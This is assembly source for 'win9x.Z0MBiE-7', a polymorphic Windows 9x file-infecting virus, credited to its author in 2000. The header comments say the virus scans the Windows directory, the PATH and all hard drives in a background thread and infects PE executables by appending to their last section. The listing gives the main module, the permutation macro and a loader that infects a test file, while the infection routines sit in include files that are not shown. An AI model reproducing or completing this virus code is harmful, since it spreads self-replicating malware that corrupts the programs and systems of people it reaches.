   ; ===========================================================================
   ; win9x.Z0MBiE-7       build 001       (x) 2000 Z0MBiE, http://z0mbie.cjb.net
   ; ===========================================================================

   ; win9X permutating virus: PLY-alike algorithm
   ; based on Z0MBiE-6.a

   ; - creates thread which will scan files while current process is running
   ; - recursive scan files in %windir%, %path% and then all hds
   ; - pe-exe infection by appending to last section

   CODESIZE                equ     10000h  ; 64k <-- size of permutating buffer
   DATA_RVA                equ     2000h   ; .data RVA

   PLYSIZE                 equ     16

   include                 mz.inc          ; mz header
   include                 pe.inc          ; pe header
   include                 seh.inc         ; seh macros
   include                 s2c.inc         ; string -> code conversion

   cmd                     macro
                           ii      = $-start
                           jj      = (ii + PLYSIZE - 1) / PLYSIZE
                           jj      = jj * PLYSIZE - ii
                           if      jj ne 0
                           db      jj dup (90h)
                           endif
                           endm

                           p386
                           model   flat
                           locals  __

                           .data   ; contains the virus. should be at .DATA_RVA

   start:

   include                 import.inc              ; import stuff
   include                 infect.inc              ; file infecting
   include                 fioexlow.inc            ; file io
   include                 rnd.inc                 ; randomer
   include                 startup.inc             ; startup code
   include                 onexec.inc              ; onexec()
   include                 recserch.inc            ; file scanning
   include                 gencopy.inc             ; new copy generation

   realsize                equ     $-start

   xbuf_size               equ     CODESIZE-realsize
   xbuf                    db      xbuf_size dup (0)

                         ; org     start+CODESIZE

   xx_first:               import_main 2

   patch_start             dd      ?
   patch_eip               dd      ?

   is_copy                 dd      ?

   randseed                dd      ?

   ff                      ff_struc ?

   buf                     db      CODESIZE dup (?)

   DATASIZE                equ     ($-start+4095) and (not 4095)

                           .code   ; contains virus loader

   loader:
                           call    init_win32api
                           call    randomize

                           lea     edx, testfile
                           call    infect_file

                           push    -1
                           extern  ExitProcess:PROC
                           call    ExitProcess

   testfile                db      'TEST.EXE',0

                           end     loader
